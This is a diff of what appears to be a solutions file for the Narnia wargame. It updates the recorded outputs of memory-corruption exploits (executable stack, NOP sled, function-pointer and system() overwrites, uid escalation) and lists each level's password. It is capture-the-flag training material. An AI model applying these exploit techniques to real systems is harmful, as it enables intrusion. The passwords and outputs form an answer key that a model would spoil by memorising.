@@ -39,7 +39,7 @@
     ]
    ],
    "out": [
-    "uid=14002(narnia2) gid=14002(narnia2)"
+    "uid=14002(narnia2) gid=14001(narnia1) groups=14001(narnia1)"
    ],
    "pw": "0h8Tj5fxbv"
   },
@@ -69,12 +69,11 @@
     ]
    ],
    "out": [
-    "GNU_STACK RWE (executable stack)",
-    "ASLR off (randomize_va_space = 0)",
-    "loaded 78 bytes",
-    "PWN!",
-    "HIT at 0xffffd1f8",
-    "uid=14003(narnia3) gid=14002(narnia2)"
+    "GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10",
+    "0",
+    "/tmp/l2.bin: 78 bytes",
+    "HIT at 0xffffd1f8 after 127 probes (0.1 s)",
+    "uid=14003(narnia3) gid=14002(narnia2) groups=14002(narnia2)"
    ],
    "pw": "F5AYQwE8PA"
   },
@@ -92,7 +91,10 @@
      "cat /tmp/out3"
     ]
    ],
-   "out": [],
+   "out": [
+    "copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/out3 to a safer place... (/tmp/out3)",
+    "CyWyf6uGWQ"
+   ],
    "pw": "CyWyf6uGWQ",
    "note": "the program copies /etc/narnia_pass/narnia4 into the attacker-readable file"
   },
@@ -117,9 +119,12 @@
     ]
    ],
    "out": [
-    "GNU_STACK RWE",
-    "ASLR off",
-    "uid=14005(narnia5) gid=14004(narnia4)"
+    "GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10",
+    "0",
+    "$1 = 0xffffd2a4",
+    "$2 = 0xffffd3ac",
+    "landed in the NOP sled at 0xffffdc04",
+    "uid=14005(narnia5) gid=14004(narnia4) groups=14004(narnia4)"
    ],
    "pw": "4VhyE9TRcd"
   },
@@ -139,7 +144,12 @@
     ]
    ],
    "out": [
-    "uid=14006(narnia6) gid=14005(narnia5)"
+    "$1 = 0xffffd3a0",
+    "$2 = 0xffffd360",
+    "$3 = (void *) 0xffffd354",
+    "0xffffd354:\t0xffffd360\t0x00000040\t0xffffd5fc\t0x00000040",
+    "Change i's value from 1 -> 500. GOOD",
+    "uid=14006(narnia6) gid=14005(narnia5) groups=14005(narnia5)"
    ],
    "pw": "uK3ikaZLxB"
   },
@@ -160,8 +170,13 @@
     ]
    ],
    "out": [
+    "$1 = 0xffffd394",
+    "$2 = 0xffffd38c",
+    "$3 = 0xffffd39c",
+    "0xffffd388:\t0xffffd5f7\t0x00000000\t0xffffffff\t0xf7d7eb70",
     "0xf7dc0ce0",
-    "uid=14007(narnia7) gid=14006(narnia6)"
+    "fpMARK -> system = 0xf7dc0ce0",
+    "uid=14007(narnia7) gid=14006(narnia6) groups=14006(narnia6)"
    ],
    "pw": "Hwsfol90tt"
   },
@@ -181,7 +196,10 @@
     ]
    ],
    "out": [
-    "uid=14008(narnia8) gid=14007(narnia7)"
+    "goodfunction() = 0x80492ea",
+    "hackedfunction() = 0x804930f",
+    "before : ptrf() = 0x80492ea (0xffffd318)",
+    "uid=14008(narnia8) gid=14007(narnia7) groups=14007(narnia7)"
    ],
    "pw": "aToTvI5BYB"
   },
@@ -203,8 +221,12 @@
     ]
    ],
    "out": [
-    "no 00 bytes, 78 bytes long",
-    "uid=14009(narnia9) gid=14008(narnia8)"
+    "$1 = 0xffffd39c",
+    "$2 = 0xffffd384",
+    "$3 = 0xffffd398",
+    "0xffffd384:\t0x41414141\t0x00000000\t0x00000000\t0x00000000",
+    "PWN!",
+    "uid=14009(narnia9) gid=14008(narnia8) groups=14008(narnia8)"
    ],
    "pw": "za689KedXW"
   },
